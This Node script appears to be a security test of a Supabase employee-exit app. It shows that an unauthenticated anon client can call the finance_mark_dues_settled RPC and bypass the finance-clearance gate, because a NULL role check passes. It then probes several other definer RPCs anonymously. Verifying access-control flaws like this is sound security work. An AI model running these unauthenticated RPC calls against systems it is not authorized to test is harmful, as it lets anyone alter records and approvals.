import { anonAs, svc, employee, j } from './lib.mjs'
import { createClient } from '@supabase/supabase-js'
const db = svc()
const CID = process.argv[2]

// Reset the disposable case to a clean "finance has NOT cleared" state first,
// so the bypass is unambiguous.
await db.from('exit_cases').update({ finance_cleared: false, finance_rejected: false, dues_note: null }).eq('id', CID)
const { data: b } = await db.from('exit_cases').select('finance_cleared,finance_rejected,dues_note').eq('id', CID).single()
console.log('BEFORE (service-key read):', j(b))

console.log('\nStep 1 — sign in as the ordinary employee Emp021 (anon key, normal login)')
const { client: emp } = await anonAs(employee('Emp021').email, employee('Emp021').password)
const { data: mine } = await emp.from('employee_exit_view').select('id, employee_name')
console.log('  employee_exit_view gives them their own case id:', j(mine))
const myCase = mine[0].id
console.log('  matches disposable case?', myCase === CID)

console.log('\nStep 2 — the SAME anon key with NO Authorization header (i.e. just log out / strip the token)')
const noSession = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY, { auth: { persistSession: false } })
const r = await noSession.rpc('finance_mark_dues_settled', { p_case_id: myCase, p_dues_note: 'settled by nobody' })
console.log('  POST /rest/v1/rpc/finance_mark_dues_settled ->', r.error ? 'ERR ' + r.error.message : 'HTTP 2xx, no error')

const { data: a } = await db.from('exit_cases').select('finance_cleared,finance_rejected,dues_note').eq('id', CID).single()
console.log('\nAFTER (service-key read):', j(a))
console.log('  finance gate bypassed?', b.finance_cleared === false && a.finance_cleared === true)

console.log('\nStep 3 — same call, but WITH a signed-in employee session (role is non-NULL)')
const r2 = await emp.rpc('finance_mark_dues_settled', { p_case_id: myCase, p_dues_note: 'x' })
console.log('  ->', r2.error ? 'ERR ' + r2.error.message : 'SUCCEEDED')
console.log('\n  => the guard only works when auth.uid() resolves to a profile; NULL <> \'finance\' is NULL, not TRUE.')

console.log('\nStep 4 — does the same hole exist on the other definer RPCs?')
for (const [fn, args] of [
  ['finance_reject_dues', { p_case_id: CID, p_reason: 'nobody says no' }],
  ['app_current_role', {}],
  ['owns_exit_case', { p_case_id: CID }],
  ['exit_case_cleared_for_relieving', { p_case_id: CID }],
  ['match_exit_docs', { query_embedding: new Array(1536).fill(0.01), match_count: 3 }],
]) {
  const x = await noSession.rpc(fn, args)
  console.log(`  anon ${fn.padEnd(34)} -> ${x.error ? 'ERR ' + x.error.message : 'ALLOWED, returned ' + JSON.stringify(x.data).slice(0, 80)}`)
}
const { data: a2 } = await db.from('exit_cases').select('finance_cleared,finance_rejected,dues_note').eq('id', CID).single()
console.log('  after anon finance_reject_dues:', j(a2))
